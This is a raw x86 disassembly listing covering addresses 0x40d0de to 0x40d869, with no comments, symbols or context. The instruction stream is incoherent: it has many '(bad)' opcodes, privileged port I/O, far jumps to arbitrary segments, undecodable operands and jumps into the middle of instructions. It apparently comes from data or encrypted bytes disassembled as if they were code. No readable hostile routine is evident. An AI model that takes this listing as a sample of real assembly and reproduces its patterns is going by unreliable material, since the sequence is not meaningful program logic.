  40d0de:	mov    dl,0xc6
  40d0e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0e1:	dec    ebp
  40d0e2:	jmp    0x9252:0xb903b948
  40d0e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0ea:	mul    DWORD PTR [edi+0x5c1ee61]
  40d0f0:	add    BYTE PTR [edx+0x4a],cl
  40d0f3:	push   edi
  40d0f4:	arpl   WORD PTR [edx-0x5771f319],bp
  40d0fa:	loopne 0x40d0e2
  40d0fc:	popa   
  40d0fd:	retf   0xbebc
  40d100:	jmp    0x681a:0xecf14430
  40d107:	ror    ch,1
  40d109:	addr16 popa 
  40d10b:	popa   
  40d10c:	rcl    bl,0xb0
  40d10f:	fcomp  QWORD PTR [esi+0x25b8d1c7]
  40d115:	rcl    BYTE PTR [edx],cl
  40d117:	mov    ds:0x5e7dd97a,eax
  40d11c:	inc    ecx
  40d11d:	in     al,0xf
  40d11f:	retf   0xec38
  40d122:	add    BYTE PTR [ebx+0x43],bh
  40d125:	sbb    edx,DWORD PTR [edi]
  40d127:	push   ds
  40d128:	sbb    al,0x1c
  40d12a:	(bad)  
  40d12b:	pop    edx
  40d12c:	neg    DWORD PTR [ecx]
  40d12e:	mov    ebp,0xc2ae4011
  40d133:	or     BYTE PTR [ebx+esi*2+0x79],ah
  40d137:	scas   eax,DWORD PTR es:[edi]
  40d138:	pop    esi
  40d139:	jp     0x40d1ae
  40d13b:	aad    0xc3
  40d13d:	aas    
  40d13e:	imul   edx,DWORD PTR [ecx+0x38fd4ca],0xffffffb0
  40d145:	xchg   ebp,eax
  40d146:	mov    ds:0x95f90770,eax
  40d14b:	sar    DWORD PTR ds:[edi+ebx*4-0x36],0x7c
  40d151:	jge    0x40d1cd
  40d153:	outs   dx,DWORD PTR ds:[esi]
  40d154:	cmp    BYTE PTR [eax],al
  40d156:	push   esp
  40d157:	shl    DWORD PTR [ebx+edi*4-0x53],0x5f
  40d15c:	mov    ds:0x563c5c03,al
  40d161:	shl    BYTE PTR [edx+0x33],0x15
  40d165:	ss push 0xe2d108b3
  40d16b:	inc    eax
  40d16c:	loopne 0x40d131
  40d16e:	sbb    dl,BYTE PTR [edx+0x504980e1]
  40d174:	dec    edi
  40d175:	mov    eax,0x6d687136
  40d17a:	cmp    al,BYTE PTR [esi+0x55842b84]
  40d180:	mov    edx,0x231f0dec
  40d185:	lds    edx,FWORD PTR [eax+0x376b6e7a]
  40d18b:	sub    BYTE PTR [esi],dh
  40d18d:	in     al,0xc8
  40d18f:	jbe    0x40d130
  40d191:	imul   eax,ecx,0x2149df9a
  40d197:	ret    
  40d198:	sbb    DWORD PTR [edx+0x42508d1b],ebp
  40d19e:	sub    eax,0xf72a5901
  40d1a3:	into   
  40d1a4:	stos   DWORD PTR es:[edi],eax
  40d1a5:	mov    esp,0x637ac37c
  40d1aa:	cmp    DWORD PTR [eax],ecx
  40d1ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1ad:	jb     0x40d19b
  40d1af:	test   DWORD PTR [ebp-0x39],eax
  40d1b2:	dec    ebp
  40d1b3:	jno    0x40d153
  40d1b5:	and    al,BYTE PTR [eax]
  40d1b7:	cmp    al,0xd8
  40d1b9:	adc    eax,0x167754f9
  40d1be:	dec    eax
  40d1bf:	not    DWORD PTR [esi]
  40d1c1:	mov    ah,0xfe
  40d1c3:	pop    edi
  40d1c4:	cmp    ah,BYTE PTR [ebx+0x4f]
  40d1c7:	popa   
  40d1c8:	jle    0x40d157
  40d1ca:	push   ebp
  40d1cb:	add    eax,0x21166e15
  40d1d0:	sbb    BYTE PTR [edi],bh
  40d1d2:	bound  edi,QWORD PTR [edi]
  40d1d4:	imul   esi,edi,0x59
  40d1d7:	jge    0x40d175
  40d1d9:	sub    al,0x79
  40d1db:	cmc    
  40d1dc:	idiv   BYTE PTR [edi+eax*8]
  40d1df:	(bad)  
  40d1e1:	add    eax,0x30d3bb53
  40d1e6:	mov    ch,BYTE PTR ss:[ebx]
  40d1e9:	mov    ecx,0xb87a2223
  40d1ee:	fwait
  40d1ef:	out    0x91,eax
  40d1f1:	push   ecx
  40d1f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1f3:	pop    ebp
  40d1f4:	sbb    ebp,DWORD PTR [ebx-0x4dc2d20]
  40d1fa:	lock mov eax,ds:0x63e15c2b
  40d200:	inc    eax
  40d201:	arpl   dx,ax
  40d203:	leave  
  40d204:	inc    eax
  40d205:	or     eax,0x48db1511
  40d20a:	mov    al,ds:0x6d92ee42
  40d20f:	dec    edx
  40d210:	hlt    
  40d211:	gs stos BYTE PTR es:[edi],al
  40d213:	rcr    DWORD PTR [ebx],cl
  40d215:	pushf  
  40d216:	pop    ebp
  40d217:	cmc    
  40d218:	mov    al,ds:0x6af84dfc
  40d21d:	xor    al,0x6b
  40d21f:	mov    ecx,0xd4e45980
  40d224:	add    eax,0x22bbb2bf
  40d229:	(bad)  
  40d22c:	jnp    0x40d22c
  40d22e:	cmpxchg DWORD PTR [ecx-0x3c9df368],edi
  40d235:	sbb    ebx,ebx
  40d237:	jmp    0x40d256
  40d239:	jo     0x40d21e
  40d23b:	push   ss
  40d23c:	mov    bh,0x4c
  40d23e:	jnp    0x40d1fc
  40d240:	mov    BYTE PTR [eax],dh
  40d242:	mov    ecx,0x9c7db717
  40d247:	jnp    0x40d27c
  40d249:	loop   0x40d245
  40d24b:	pop    edx
  40d24c:	adc    DWORD PTR [edi],edx
  40d24e:	xor    eax,0x24511120
  40d253:	cmp    eax,edi
  40d255:	fwait
  40d256:	push   0xffffff8e
  40d258:	xchg   ecx,eax
  40d259:	xchg   ebx,eax
  40d25a:	xchg   esp,eax
  40d25b:	scas   eax,DWORD PTR es:[edi]
  40d25c:	mov    al,ds:0x9aa2b944
  40d261:	ret    0xc114
  40d264:	cmp    DWORD PTR [eax-0x7],esi
  40d267:	dec    ebp
  40d268:	test   al,0x3d
  40d26a:	inc    esp
  40d26b:	inc    edi
  40d26c:	sub    al,0xda
  40d26e:	out    0x14,eax
  40d270:	jnp    0x40d21c
  40d272:	jge    0x40d2b4
  40d274:	imul   esi,DWORD PTR [eax-0x12],0x14
  40d278:	pushf  
  40d279:	test   al,0xed
  40d27b:	jmp    0xc3bc6da6
  40d280:	jns    0x40d2c5
  40d282:	retf   
  40d283:	xchg   esp,eax
  40d284:	push   ebp
  40d285:	push   ecx
  40d286:	loop   0x40d2eb
  40d288:	push   ecx
  40d289:	add    ch,BYTE PTR [ebp+0x1b7dc0bf]
  40d28f:	cmp    esi,DWORD PTR [edi+edx*4-0x500fd5ff]
  40d296:	enter  0xc473,0x79
  40d29a:	mov    edx,0xc1db452f
  40d29f:	jo     0x40d320
  40d2a1:	inc    ecx
  40d2a2:	rcr    ebp,1
  40d2a4:	ds mov eax,0xccefc543
  40d2aa:	mov    ds:0x23e6ed31,eax
  40d2af:	add    BYTE PTR ds:0xc400189e,bl
  40d2b5:	lea    esp,[ecx+eiz*2-0x20]
  40d2b9:	mov    ds:0xbb7c0fc2,al
  40d2be:	(bad)  
  40d2bf:	(bad)  
  40d2c0:	pop    ebp
  40d2c1:	fbstp  TBYTE PTR [edx-0x55695e85]
  40d2c7:	pop    ebp
  40d2c8:	mov    ecx,0x635d2ff0
  40d2cd:	sub    al,0x5d
  40d2cf:	and    DWORD PTR [ecx+0x44f1b8],0x49
  40d2d6:	ror    BYTE PTR cs:[edi],0x90
  40d2da:	ins    BYTE PTR es:[edi],dx
  40d2db:	dec    esp
  40d2dc:	test   al,0x93
  40d2de:	in     eax,0xd8
  40d2e0:	dec    esp
  40d2e1:	ins    DWORD PTR es:[edi],dx
  40d2e2:	test   dl,al
  40d2e4:	inc    ebx
  40d2e5:	out    0x58,al
  40d2e7:	(bad)  
  40d2e8:	ja     0x40d27c
  40d2ea:	xchg   ebp,eax
  40d2eb:	xor    DWORD PTR [edx],esp
  40d2ed:	mov    eax,0x357cc6bf
  40d2f2:	or     edx,edx
  40d2f4:	es aad 0xce
  40d2f7:	mov    esp,0x7131b0d2
  40d2fc:	jg     0x40d37c
  40d2fe:	repz cs adc bl,al
  40d302:	aad    0x71
  40d304:	test   BYTE PTR [eax+0x7],0x50
  40d308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d309:	js     0x40d36a
  40d30b:	(bad)  
  40d30c:	stc    
  40d30d:	jns    0x40d326
  40d30f:	inc    edx
  40d310:	pop    edx
  40d311:	push   esi
  40d312:	adc    eax,0xc4373d20
  40d317:	push   esp
  40d318:	into   
  40d319:	sbb    ah,dl
  40d31b:	fucomip st,st(5)
  40d31d:	dec    edi
  40d31e:	inc    edi
  40d31f:	fst    DWORD PTR [esi-0x657887a4]
  40d325:	and    BYTE PTR [edx+0x4c],cl
  40d328:	(bad)  
  40d32a:	fmulp  st(5),st
  40d32c:	mov    edx,0xf0a1bb28
  40d331:	cmp    al,0xc1
  40d333:	je     0x40d37e
  40d335:	pop    ecx
  40d336:	pop    esp
  40d337:	adc    BYTE PTR [eax-0x36],cl
  40d33a:	ja     0x40d383
  40d33c:	push   es
  40d33d:	inc    ebp
  40d33e:	jns    0x40d35a
  40d340:	(bad)
  40d344:	popa   
  40d345:	daa    
  40d346:	lods   eax,DWORD PTR ds:[esi]
  40d347:	mov    bh,0xd9
  40d349:	retf   
  40d34a:	push   ebx
  40d34b:	mov    BYTE PTR [esp+esi*8],0x71
  40d34f:	mov    dl,0x1c
  40d351:	add    ch,BYTE PTR [ebx-0x1a3cb4c1]
  40d357:	imul   esp,DWORD PTR [eax],0xb78a834d
  40d35d:	(bad)  
  40d35e:	fnstsw WORD PTR [edi]
  40d360:	sub    BYTE PTR [esi-0x5e],0x99
  40d364:	mov    bl,0x51
  40d366:	outs   dx,DWORD PTR ds:[esi]
  40d367:	mov    ds:0xbb4022ca,eax
  40d36c:	shr    DWORD PTR [ecx],0x9c
  40d36f:	mov    edx,0x60c1493e
  40d374:	or     DWORD PTR [eax-0x46],0xffffffac
  40d378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d379:	je     0x40d373
  40d37b:	pop    ebp
  40d37c:	pop    bp
  40d37e:	xlat   BYTE PTR ds:[ebx]
  40d37f:	sub    cl,ch
  40d381:	das    
  40d382:	frstor [ecx]
  40d384:	mov    edi,0xcbde313c
  40d389:	das    
  40d38a:	fldenv ds:0xf4260966
  40d390:	mov    ah,0x1d
  40d392:	call   0xa2ca7469
  40d397:	mov    WORD PTR [ebx+eiz*2],cs
  40d39a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d39b:	jmp    FWORD PTR [ecx*4-0x141a4dfb]
  40d3a2:	inc    ebp
  40d3a3:	inc    ecx
  40d3a4:	cwde   
  40d3a5:	mov    dl,0xa0
  40d3a7:	xchg   ebx,eax
  40d3a8:	mov    bl,BYTE PTR [ebp+0x77]
  40d3ab:	test   al,0x52
  40d3ae:	pop    ebp
  40d3af:	mov    WORD PTR ds:0xc5077770,fs
  40d3b5:	xchg   ebx,eax
  40d3b6:	cwde   
  40d3b7:	out    0xa3,eax
  40d3b9:	mov    cl,0xa6
  40d3bb:	fild   DWORD PTR [eax]
  40d3bd:	cmp    DWORD PTR [ebp+ebx*8-0x36032609],ebx
  40d3c4:	sbb    DWORD PTR [esi+0x3681684b],eax
  40d3ca:	mov    eax,gs
  40d3cc:	pop    esi
  40d3cd:	sub    al,0xb0
  40d3cf:	xor    ch,dl
  40d3d1:	push   esp
  40d3d2:	inc    ebp
  40d3d3:	test   eax,0xe74bad4a
  40d3d8:	out    dx,eax
  40d3d9:	inc    edx
  40d3da:	ins    DWORD PTR es:[edi],dx
  40d3db:	fadd   st(3),st
  40d3dd:	or     eax,0x6c2858e
  40d3e2:	cmp    DWORD PTR [ecx],esi
  40d3e4:	jnp    0x40d411
  40d3e6:	push   es
  40d3e7:	aad    0xca
  40d3e9:	mov    al,0x62
  40d3eb:	jno    0x40d418
  40d3ed:	xchg   edx,eax
  40d3ee:	jmp    0x40d467
  40d3f0:	sbb    BYTE PTR [esi+ebp*4],0xb6
  40d3f4:	push   0xca6f08f7
  40d3f9:	or     eax,0x4e6acfe7
  40d3fe:	mov    BYTE PTR [edx],bh
  40d400:	dec    ebp
  40d401:	loope  0x40d3f4
  40d403:	xchg   BYTE PTR [ebx-0x70],dl
  40d406:	cmp    al,0x8c
  40d408:	mov    ah,bh
  40d40a:	dec    ecx
  40d40b:	jbe    0x40d45b
  40d40d:	aaa    
  40d40e:	inc    ebp
  40d40f:	cli    
  40d410:	pop    ebx
  40d411:	sub    al,BYTE PTR [esi+0x45]
  40d414:	(bad)  
  40d415:	cmp    al,0xe0
  40d417:	jne    0x40d454
  40d419:	dec    ebp
  40d41a:	daa    
  40d41b:	mov    esp,0xfd8d10aa
  40d420:	fmul   DWORD PTR [ecx+0xb897b53]
  40d426:	lahf   
  40d427:	push   esi
  40d428:	sub    eax,0x4a79e96e
  40d42d:	fcomp  DWORD PTR [esi+esi*2-0xedba0d5]
  40d434:	leave  
  40d435:	sbb    DWORD PTR [esp+edi*2+0x71],esi
  40d439:	data16 (bad) 
  40d43b:	popa   
  40d43c:	mov    esi,0x6717d280
  40d441:	(bad)  
  40d442:	(bad)  
  40d443:	sbb    ax,0x3a6d
  40d447:	mov    ?,WORD PTR [ebp-0x53]
  40d44a:	sub    eax,0x1fdcc2cd
  40d44f:	and    BYTE PTR [ebx-0x10],ah
  40d452:	xor    BYTE PTR [edi-0x10],0xa
  40d456:	lds    esi,FWORD PTR [edx+0xe2d93a]
  40d45c:	mov    DWORD PTR [edx-0x7e6f5677],edx
  40d462:	push   edx
  40d463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d464:	adc    BYTE PTR [ebx],bh
  40d466:	nop
  40d467:	adc    al,0x49
  40d469:	xor    eax,DWORD PTR [edi]
  40d46b:	adc    DWORD PTR [edi-0x77],eax
  40d46e:	mov    esi,0xa8b82398
  40d473:	pop    edi
  40d474:	scas   al,BYTE PTR es:[edi]
  40d475:	cmp    dh,0x95
  40d478:	cld    
  40d479:	inc    ebp
  40d47a:	jle    0x40d46c
  40d47c:	mov    ebx,0xcda6649b
  40d481:	push   0x13fdfcf9
  40d486:	cmp    eax,0x676a0858
  40d48b:	mov    DWORD PTR [eax],edi
  40d48d:	(bad)  
  40d48e:	in     al,0xa7
  40d490:	jmp    DWORD PTR [eax+0x75]
  40d493:	mov    ah,0x4
  40d495:	or     al,ah
  40d497:	add    DWORD PTR [ebp+0x790f884d],esp
  40d49d:	hlt    
  40d49e:	inc    eax
  40d49f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4a0:	add    bl,ch
  40d4a2:	mov    al,ds:0xe6beaa98
  40d4a7:	dec    ebx
  40d4a8:	or     esp,DWORD PTR [edi-0x3b4adef0]
  40d4ae:	hlt    
  40d4af:	mov    dl,0x6
  40d4b1:	imul   esp,DWORD PTR [eax+edx*2+0x602fcbc4],0x11c06f3b
  40d4bc:	inc    esi
  40d4bd:	sub    cl,BYTE PTR [ecx]
  40d4bf:	and    esp,ecx
  40d4c1:	out    0x41,eax
  40d4c3:	dec    edx
  40d4c4:	cmp    BYTE PTR [ebp-0x3fce305b],ah
  40d4ca:	mov    edi,0x7fa2d18e
  40d4cf:	sahf   
  40d4d0:	cmp    eax,0x930148e9
  40d4d5:	ficomp DWORD PTR [eax-0x3e]
  40d4d8:	sbb    DWORD PTR [edx-0x3ceedec6],esi
  40d4de:	sub    al,0x59
  40d4e0:	fwait
  40d4e1:	and    eax,0x465aea68
  40d4e6:	and    eax,0x5a58de9c
  40d4eb:	jnp    0x40d4ff
  40d4ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4ee:	(bad)  
  40d4ef:	in     eax,dx
  40d4f0:	pop    ebx
  40d4f1:	in     eax,0xfd
  40d4f3:	iret   
  40d4f4:	mov    edi,0xaeb4aeb5
  40d4f9:	mov    dl,0x15
  40d4fb:	sbb    al,0xfb
  40d4fd:	dec    ecx
  40d4fe:	popf   
  40d4ff:	push   es
  40d500:	inc    ebp
  40d501:	xor    eax,0x57278b12
  40d506:	dec    ecx
  40d507:	and    al,0x6
  40d509:	dec    edx
  40d50a:	inc    edx
  40d50b:	daa    
  40d50c:	test   al,ah
  40d50e:	push   eax
  40d50f:	out    dx,eax
  40d510:	add    DWORD PTR [edx],edx
  40d512:	inc    eax
  40d513:	push   eax
  40d514:	cli    
  40d515:	bound  esi,QWORD PTR [edx-0x6e]
  40d518:	(bad)  
  40d519:	push   esp
  40d51a:	das    
  40d51b:	das    
  40d51c:	xchg   esp,eax
  40d51d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d51e:	mov    ebp,0xdf8b862a
  40d523:	push   ss
  40d524:	mov    ds:0xb983d758,eax
  40d529:	push   eax
  40d52a:	in     al,0x11
  40d52c:	les    ebp,FWORD PTR [edx]
  40d52e:	push   esi
  40d52f:	pop    ebp
  40d530:	jnp    0x40d544
  40d532:	mov    eax,ds:0xaf3b15c8
  40d537:	aam    0xa1
  40d539:	mov    esp,0xf7340897
  40d53e:	cmp    edi,edx
  40d540:	mov    eax,0x47024707
  40d545:	jecxz  0x40d51c
  40d547:	out    dx,al
  40d548:	in     eax,0xc
  40d54a:	and    eax,0xeee7059d
  40d54f:	push   0x5a18a7f
  40d554:	xor    al,0x7
  40d556:	or     esp,DWORD PTR [ebx-0x27]
  40d559:	sub    DWORD PTR [esi],ebx
  40d55b:	jo     0x40d5b1
  40d55d:	mov    ds:0xa0d7fdad,al
  40d562:	add    esp,ebp
  40d564:	xor    dh,BYTE PTR [ecx]
  40d566:	mov    ch,0x4f
  40d568:	and    edx,ebp
  40d56a:	icebp  
  40d56b:	jecxz  0x40d5cf
  40d56d:	cmc    
  40d56e:	dec    ebx
  40d56f:	cwde   
  40d570:	jmp    0x40d4ff
  40d572:	push   cs
  40d573:	push   edi
  40d574:	pop    es
  40d575:	inc    esi
  40d576:	add    eax,0xfc09ccd
  40d57b:	dec    edx
  40d57c:	out    0x14,al
  40d57e:	sbb    edx,esi
  40d580:	mov    eax,0xd000bb9f
  40d585:	mov    esi,0xb0d4aa95
  40d58a:	rol    BYTE PTR [edi+0x3c],cl
  40d58d:	or     al,0x9d
  40d58f:	out    dx,eax
  40d590:	and    eax,0x25d08995
  40d595:	js     0x40d5e6
  40d597:	or     eax,0x611992c3
  40d59c:	mov    dl,0x2
  40d59e:	dec    esp
  40d59f:	or     al,0xf6
  40d5a1:	js     0x40d5c3
  40d5a3:	enter  0x2f27,0xeb
  40d5a7:	inc    edi
  40d5a8:	dec    esp
  40d5a9:	aam    0x4f
  40d5ab:	mov    al,0xd4
  40d5ad:	mov    ds:0x9e70c834,eax
  40d5b2:	xchg   BYTE PTR [ebx],al
  40d5b4:	jge    0x40d603
  40d5b6:	adc    al,0xa0
  40d5b8:	pushf  
  40d5b9:	push   0xffffffca
  40d5bb:	pop    ss
  40d5bc:	fist   DWORD PTR [ebp-0x3be2b296]
  40d5c2:	(bad)  
  40d5c3:	fwait
  40d5c4:	xchg   ecx,eax
  40d5c5:	fild   DWORD PTR [ebp+ecx*4-0x1fbfe1cb]
  40d5cc:	xor    DWORD PTR [eax],esp
  40d5ce:	bound  edi,QWORD PTR [eax+0x14]
  40d5d1:	gs stc 
  40d5d3:	das    
  40d5d4:	outs   dx,BYTE PTR ds:[esi]
  40d5d5:	mov    ch,0x25
  40d5d7:	sub    eax,0xc2755d1f
  40d5dc:	arpl   dx,sp
  40d5de:	clc    
  40d5df:	cld    
  40d5e0:	cmp    al,bh
  40d5e2:	fdiv   st(5),st
  40d5e4:	pop    esi
  40d5e5:	add    ecx,DWORD PTR [ecx]
  40d5e7:	and    BYTE PTR [eax+0xc68b5dd],dh
  40d5ed:	pop    edi
  40d5ee:	cmc    
  40d5ef:	mov    edx,0x71fdc57e
  40d5f4:	aam    0x8b
  40d5f6:	inc    esp
  40d5f7:	or     eax,DWORD PTR [esi-0x6f483a41]
  40d5fd:	pop    esp
  40d5fe:	pop    esi
  40d5ff:	jae    0x40d5db
  40d601:	add    ebx,DWORD PTR [ecx+0x77]
  40d604:	popf   
  40d605:	mov    esi,0x6b5917fb
  40d60a:	sbb    DWORD PTR [eax-0x3b],eax
  40d60d:	adc    eax,0x5c568b54
  40d612:	lea    ecx,[edi-0x6d]
  40d615:	sub    eax,0xbc2e0ae2
  40d61a:	or     eax,0x6f408fbb
  40d61f:	lock xchg ecx,eax
  40d621:	xor    bl,BYTE PTR [ecx-0x27]
  40d624:	in     al,0x44
  40d626:	dec    DWORD PTR [esi]
  40d628:	jecxz  0x40d61a
  40d62a:	sbb    ch,ch
  40d62c:	push   edx
  40d62d:	iret   
  40d62e:	or     eax,0x21c71f7a
  40d633:	ret    
  40d634:	sub    eax,0xb5289106
  40d639:	int3   
  40d63a:	add    al,0x86
  40d63c:	ret    0x8a2b
  40d63f:	jae    0x40d613
  40d641:	ret    
  40d642:	jmp    0x335ec2f
  40d647:	ret    
  40d648:	rcr    ebx,cl
  40d64a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d64b:	sub    DWORD PTR [ebx],esi
  40d64d:	(bad)  
  40d64e:	imul   BYTE PTR [ecx+0x7c23b96]
  40d654:	mov    eax,0x9c3c63a9
  40d659:	xchg   edi,eax
  40d65a:	sahf   
  40d65b:	stc    
  40d65c:	cmc    
  40d65d:	sahf   
  40d65e:	or     ah,BYTE PTR ds:0x7fdbf50b
  40d664:	inc    ebp
  40d665:	enter  0x8eef,0xa1
  40d669:	xor    dh,al
  40d66b:	shr    DWORD PTR [eax],1
  40d66d:	sti    
  40d66e:	stos   DWORD PTR es:[edi],eax
  40d66f:	(bad)  
  40d670:	(bad)  
  40d671:	sbb    dh,BYTE PTR [edi]
  40d673:	bound  eax,QWORD PTR [ebp+0x6f81d13a]
  40d679:	lahf   
  40d67a:	out    0x23,al
  40d67c:	into   
  40d67d:	xor    ebx,0xd3452942
  40d683:	sbb    DWORD PTR [edi],0x8ce7eb53
  40d689:	jo     0x40d668
  40d68b:	dec    esi
  40d68c:	xor    al,0xc
  40d68e:	call   0x17eaef54
  40d693:	lahf   
  40d694:	lods   eax,DWORD PTR ds:[esi]
  40d695:	push   ecx
  40d696:	and    BYTE PTR [ebp+0x6c],dl
  40d699:	das    
  40d69a:	rol    BYTE PTR [ebx*1+0x10d624b8],1
  40d6a1:	push   ss
  40d6a2:	je     0x40d6ce
  40d6a4:	pop    ss
  40d6a5:	mov    ds:0xbd2b6a17,al
  40d6aa:	lahf   
  40d6ab:	jmp    0x121:0xe10367ef
  40d6b2:	popa   
  40d6b3:	and    eax,0x510b2d9e
  40d6b8:	inc    ebp
  40d6b9:	push   esi
  40d6ba:	sbb    eax,0x13bc9699
  40d6bf:	scas   eax,DWORD PTR es:[edi]
  40d6c0:	retf   
  40d6c1:	push   es
  40d6c2:	in     eax,dx
  40d6c3:	lds    edi,FWORD PTR ss:[ebp-0x63c5040a]
  40d6ca:	pop    ecx
  40d6cb:	jle    0x40d6dc
  40d6cd:	add    BYTE PTR [edx+0x70f40807],dl
  40d6d3:	jl     0x40d6d8
  40d6d5:	or     ch,BYTE PTR [ebx+0x700b956d]
  40d6db:	pop    esp
  40d6dc:	pop    esp
  40d6dd:	xchg   ecx,eax
  40d6de:	push   0xffffffbe
  40d6e0:	ret    0xb3e2
  40d6e3:	ds dec ch
  40d6e6:	nop
  40d6e7:	ss jne 0x40d680
  40d6ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6eb:	jle    0x40d765
  40d6ed:	dec    ebp
  40d6ee:	sbb    dl,cl
  40d6f0:	nop
  40d6f1:	pop    edi
  40d6f2:	popa   
  40d6f3:	or     eax,0x1f
  40d6f6:	test   BYTE PTR [ebp+ebx*2+0x1c],dh
  40d6fa:	ds jle 0x40d690
  40d6fd:	div    eax
  40d6ff:	mov    ?,WORD PTR [edx+0xe]
  40d702:	jmp    0x89f0:0x2bab829e
  40d709:	jno    0x40d738
  40d70b:	jge    0x40d736
  40d70d:	test   esp,esi
  40d70f:	retf   0x8800
  40d712:	mov    ecx,0xbcb07129
  40d717:	fs sub eax,0x6ed20a4c
  40d71d:	inc    edx
  40d71e:	loope  0x40d714
  40d720:	test   eax,0xca3cd6e2
  40d725:	lock dec ebx
  40d727:	ss mov edi,0x2a50aeec
  40d72d:	pop    esi
  40d72e:	leave  
  40d72f:	ss dec ecx
  40d731:	or     edi,DWORD PTR [edi]
  40d733:	mov    eax,ds:0x491e6a81
  40d738:	es (bad) 
  40d73a:	push   esi
  40d73b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d73c:	out    dx,al
  40d73d:	or     al,BYTE PTR [ebp+0x8]
  40d740:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40d742:	mov    edi,0xc1c27525
  40d747:	or     ch,ah
  40d749:	cmp    eax,0x9869e3fe
  40d74e:	or     al,0x78
  40d750:	sub    dl,bh
  40d752:	iret   
  40d753:	jmp    0x40d70b
  40d755:	popa   
  40d756:	jns    0x40d6fc
  40d758:	(bad)  
  40d759:	fcom   st(6)
  40d75b:	sbb    dh,bh
  40d75d:	dec    esp
  40d75e:	ds dec esp
  40d760:	xor    BYTE PTR [eax],ah
  40d762:	imul   esp,DWORD PTR [edx+0x43],0x54
  40d766:	ins    BYTE PTR es:[edi],dx
  40d767:	inc    edx
  40d768:	out    dx,eax
  40d769:	mov    edx,0xa134ede9
  40d76e:	cmp    bh,BYTE PTR [ecx+0x6e3230b4]
  40d774:	jg     0x40d74f
  40d776:	sbb    eax,0xc2c0ccf1
  40d77b:	in     al,0x57
  40d77d:	(bad)  
  40d77e:	cmp    eax,0xc8e6294b
  40d783:	in     eax,dx
  40d784:	mov    ebx,0xc461b126
  40d789:	adc    eax,DWORD PTR [eax-0x26]
  40d78c:	push   eax
  40d78d:	out    dx,eax
  40d78e:	dec    edi
  40d78f:	cmp    DWORD PTR [edi+0x251c7b21],ebp
  40d795:	sbb    al,0x4
  40d797:	fst    QWORD PTR [ebx-0x57]
  40d79a:	push   eax
  40d79b:	push   cs
  40d79c:	add    edx,DWORD PTR ds:[ebx-0x8245174]
  40d7a3:	cmp    eax,0xb8bbb288
  40d7a8:	rol    BYTE PTR [eax-0x74],cl
  40d7ab:	xor    DWORD PTR [ebx+0x1cefca91],0x39
  40d7b2:	ss dec esp
  40d7b4:	lods   eax,DWORD PTR ds:[esi]
  40d7b5:	imul   edx,DWORD PTR [edi],0x650ad5d4
  40d7bb:	dec    edi
  40d7bc:	mov    edi,DWORD PTR [ecx]
  40d7be:	inc    ebp
  40d7bf:	sub    edx,DWORD PTR ds:0xa1e73dd4
  40d7c5:	sti    
  40d7c6:	sbb    dh,BYTE PTR [ecx]
  40d7c8:	adc    ebp,0x26
  40d7cb:	stc    
  40d7cc:	clc    
  40d7cd:	xor    BYTE PTR [edx-0x4e376c66],dh
  40d7d3:	pop    ecx
  40d7d4:	sub    BYTE PTR [ecx-0x2e],bh
  40d7d7:	pop    ss
  40d7d8:	out    0xd2,al
  40d7da:	dec    esp
  40d7db:	dec    eax
  40d7dc:	mov    esp,ds
  40d7de:	jp     0x40d775
  40d7e0:	fistp  QWORD PTR [ecx+ecx*2-0x51]
  40d7e4:	push   ss
  40d7e5:	push   esp
  40d7e6:	dec    esi
  40d7e7:	xchg   ecx,eax
  40d7e8:	mov    ecx,0xb1f1fca4
  40d7ed:	fdiv   DWORD PTR [edx]
  40d7ef:	bound  ebp,QWORD PTR [edx]
  40d7f1:	out    dx,al
  40d7f2:	out    dx,eax
  40d7f3:	adc    ebp,edi
  40d7f5:	cmp    al,0x16
  40d7f7:	xchg   ecx,eax
  40d7f8:	std    
  40d7f9:	sar    DWORD PTR [ecx],1
  40d7fb:	arpl   WORD PTR [ebx-0x18],ax
  40d7fe:	or     DWORD PTR [edi-0x14],0x9be34664
  40d805:	xor    eax,0x4e0a3060
  40d80a:	leave  
  40d80b:	and    eax,0xfbc95827
  40d810:	push   esp
  40d811:	(bad)
  40d814:	ret    0xebde
  40d817:	pop    edx
  40d818:	sbb    DWORD PTR [edi],0xd6f1b751
  40d81e:	sbb    esi,DWORD PTR [eax-0x6d]
  40d821:	add    al,0xd1
  40d823:	jno    0x40d87d
  40d825:	(bad)  
  40d826:	(bad)  
  40d827:	loopne 0x40d88c
  40d829:	cmp    BYTE PTR [ebp-0x65023e49],al
  40d82f:	retf   
  40d830:	sar    DWORD PTR [edx+ecx*1-0x3a19a0c0],cl
  40d837:	leave  
  40d838:	xor    BYTE PTR [eax],dl
  40d83a:	popf   
  40d83b:	out    dx,al
  40d83c:	loopne 0x40d833
  40d83e:	mov    bl,ah
  40d840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d841:	icebp  
  40d842:	xor    BYTE PTR [edx-0x55],ch
  40d845:	inc    edx
  40d846:	push   ecx
  40d847:	xor    dl,BYTE PTR [ecx+eiz*4-0x31]
  40d84b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d84c:	push   cs
  40d84d:	repnz fidivr DWORD PTR [edx+0x7d]
  40d851:	test   al,bl
  40d853:	pop    esp
  40d854:	das    
  40d855:	stc    
  40d856:	test   al,0x61
  40d858:	outs   dx,DWORD PTR ds:[esi]
  40d859:	bound  esi,QWORD PTR [ecx+ecx*2-0x6865b275]
  40d860:	imul   eax,DWORD PTR [esi],0x85e40339
  40d866:	push   es
  40d867:	xlat   BYTE PTR ds:[ebx]
  40d868:	pop    ebx
  40d869:	ins    DWORD PTR es:[edi],dx
